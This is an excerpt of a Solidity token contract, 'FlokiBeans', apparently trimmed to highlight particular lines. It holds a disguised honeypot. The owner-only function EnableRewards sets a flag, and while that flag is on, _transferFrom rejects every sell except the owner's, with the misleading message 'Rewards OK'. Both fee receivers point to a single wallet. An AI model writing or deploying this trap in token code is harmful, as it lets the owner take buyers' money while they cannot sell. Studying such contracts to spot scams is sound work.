...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x264c1383EA520f73dd837F915ef3a732e204a493); // BNB checksumed
...
contract FlokiBeans is IBEP20, Auth {
    ...
    address EP = 0x264c1383EA520f73dd837F915ef3a732e204a493; // BNB checksumed 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "FlokiBeans";
    ...
    address public autoLiquidityReceiver=0x8fC98E6a5f0A135E0eDf861c4fc8EeF384B3c725;
    address public marketingFeeReceiver=0x8fC98E6a5f0A135E0eDf861c4fc8EeF384B3c725;
  ...
  function EnableRewards(bool divider) external onlyOwner {
        Rewards = divider;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Rewards || sender==owner), "Rewards OK");
